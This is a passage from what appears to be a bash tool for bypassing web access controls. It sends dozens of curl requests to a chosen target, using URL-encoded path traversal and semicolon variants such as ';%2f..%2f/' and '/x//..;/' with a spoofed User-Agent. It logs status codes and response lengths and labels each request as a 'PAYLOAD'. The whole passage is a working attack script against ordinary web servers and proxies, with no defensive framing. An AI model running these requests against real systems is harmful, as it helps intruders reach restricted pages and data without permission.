	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x//..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/x//..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /x/;/../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/x/;/../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ /x/;/..;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/x/;/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}/x/;/..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ; ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%09 ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%09" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%09' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%09.. ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%09.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%09..' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%09..; ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%09..;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%09..;' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%09; ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%09;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%09;' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2F.. ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2F.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2F..' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f%2e%2e ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f%2e%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f%%%%2e%%%%2e' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f%2e%2e%2f%2e%2e%2f%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f%2e%2e%2f%2e%2e%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f%%%%2e%%%%2e%%%%2f%%%%2e%%%%2e%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f%2f/../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f%2f/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f%%%%2f/../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f.. ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f..' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f..%2f%2e%2e%2f%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..%2f%2e%2e%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f..%%%%2f%%%%2e%%%%2e%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f..%2f..%2f%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..%2f..%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f..%%%%2f..%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f..%2f/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..%2f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f..%%%%2f/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f..%2f/..%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..%2f/..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f..%%%%2f/..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f..%2f/../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..%2f/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f..%%%%2f/../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f../%2f..%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f../%2f..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f../%%%%2f..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f../%2f../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f../%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f../%%%%2f../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f..//..%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..//..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f..//..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f..//../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f..//../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f../// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..///" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f..///' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f..///; ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..///;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f..///;' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f..//;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..//;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f..//;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f..//;/; ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..//;/;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f..//;/;' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f../;// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f../;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f../;//' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f../;/;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f../;/;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f../;/;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f../;/;/; ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f../;/;/;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f../;/;/;' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f..;/// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..;///" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f..;///' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f..;//;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..;//;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f..;//;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f..;/;// ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f..;/;//" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f..;/;//' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f/%2f../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f/%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f/%%%%2f../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f//..%2f ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f//..%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f//..%%%%2f' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f//../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f//../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f//..;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f//..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f//..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f/;/../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f/;/../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f/;/../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f/;/..;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f/;/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f/;/..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f;//../ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f;//../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f;//../' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;%2f;/;/..;/ ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};%2f;/;/..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};%%%%2f;/;/..;/' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/%2e%2e ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target};/%2e%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target};/%%%%2e%%%%2e' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"
	echo -n "Payload [ ;/%2e%2e%2f%2f ]:"
